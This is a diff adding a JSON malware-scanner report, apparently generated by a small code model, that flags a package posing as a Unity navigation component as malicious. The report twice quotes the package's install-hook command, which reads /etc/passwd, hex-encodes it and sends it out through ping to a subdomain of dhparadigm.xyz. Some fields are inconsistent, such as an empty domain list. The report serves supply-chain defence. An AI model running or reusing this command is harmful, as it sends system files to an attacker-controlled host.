@@ -1,0 +1,47 @@
+{
+  "package_name": "com.unity.ai.navigation.components",
+  "version": "1.0.6",
+  "label": "malicious",
+  "behaviors": [
+    {
+      "category": "install_hook",
+      "summary": "The package contains a pre-install hook that executes at install time with the commands listed in the package metadata.",
+      "details": "The package contains a pre-install hook that executes at install time with the commands listed in the package metadata. The commands are: cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz.",
+      "confidence": 0.72,
+      "evidence_commands": [
+        "cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": []
+    },
+    {
+      "category": "suspicious_behavior",
+      "summary": "The package contains no JavaScript files.",
+      "details": "The package contains no JavaScript files. This is likely a hook-based attack payload that executes at install time via the commands listed in the package metadata.",
+      "confidence": 0.34,
+      "evidence_commands": [
+        "cat/etc/passwd|xxd-p-c16|whilereadexfil;doping-p$exfil-c1ns1.dhparadigm.xyz"
+      ],
+      "evidence_files": [],
+      "evidence_apis": [],
+      "evidence_domains": [],
+      "evidence_env_vars": []
+    }
+  ],
+  "risk_vector": [
+    "install_hook",
+    "suspicious_behavior"
+  ],
+  "analyst_note": "This JSON object represents the analysis of the package. The \"behaviors\" field contains a list of malicious behaviors detected in the package. Each behavior is categorized into one of the following categories: credential_theft, sensitive_data_collection, crypto_hijacking, network_exfiltration, data_exfiltration, local_code_execution, system_reconnaissance, backdoor_installation, network_reconnaissance, remote_code_execution, dynamic_code_execution, dependency_injection, supply_chain_propagation, supply_chain_attack, repository_manipulation, privilege_escalation, persistence, sensitive_file_access, obfuscation, anti_debugging, anti_analysis, resource_abuse, typosquatting, install_hook, system_capability, suspicious_behavior, unknown. The \"risk_vector\" field contains a list of categories that represent the potential risk of the package.",
+  "analysis_metadata": {
+    "model": "deepseek-coder-6.7b-instruct",
+    "stage": "semantic_v2.0",
+    "routing": "review",
+    "structural_risk_score": 0.336,
+    "confirmed_signals_count": 1,
+    "has_structural_backup": true
+  },
+  "created_at": "2026-03-26T22:09:52.705694"
+}
